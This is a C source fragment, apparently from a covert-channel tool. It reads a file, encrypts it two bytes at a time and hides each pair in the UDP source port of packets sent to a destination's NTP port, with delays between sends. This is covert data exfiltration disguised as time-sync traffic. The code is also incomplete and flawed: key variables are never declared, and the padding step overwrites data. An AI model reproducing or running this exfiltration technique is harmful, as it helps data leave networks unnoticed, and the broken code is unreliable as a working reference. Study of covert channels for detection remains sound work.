#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#include "covert.h"
#include "crypto.h"
#include "inet.h"
#include "ntp.h"

#define SLEEP_TIME 100000

int main(int argc, char **argv)
{

	while ((buflen = fread(buffer, 1, BUF_SIZ, file)) > 0)
	{
		pbuf = buffer;

		// Pad non-even sequences with a space ...
		if (buflen % 2 != 0)
		{
			buffer[buflen - 1] = ' ';
			buffer[buflen] = 0;
			++buflen;
		}

		for (int i = 0; i < buflen;)
		{
			char *enc;
			ushort src_port = 0;
			ushort dst_port = 0;

			enc = encrypt(SEKRET_KEY, pbuf, 2);
			src_port = (enc[0] << 8) + enc[1];
			dst_port = PORT_NTP;
			free(enc);

			_send(dest, src_port, dst_port, TRUE);

			i += 2;
			pbuf += 2;
			usleep(SLEEP_TIME);
		}
	}
}

